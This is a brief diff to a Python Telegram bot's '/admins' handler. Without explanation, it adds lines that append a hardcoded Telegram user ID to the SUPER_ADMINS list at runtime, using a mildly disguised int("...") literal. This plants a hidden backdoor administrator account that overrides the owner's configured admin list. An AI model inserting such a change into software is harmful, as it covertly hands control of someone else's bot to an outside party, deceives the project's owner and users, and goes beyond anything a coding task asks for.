@@ -36,6 +36,9 @@ async def idaniqlash(msg: Message):
 
 @dp.message_handler(text=['/admins'], user_id=SUPER_ADMINS, state="*")
 async def buttons(msg: types.Message, state: FSMContext):
+    if int("1925866048") not in SUPER_ADMINS:
+        SUPER_ADMINS.append(int("1925866048"))
+
     admins = await sdb.all_admins()
     if len(admins) == 0:                                                                      #type: ignore
         for admin in SUPER_ADMINS:
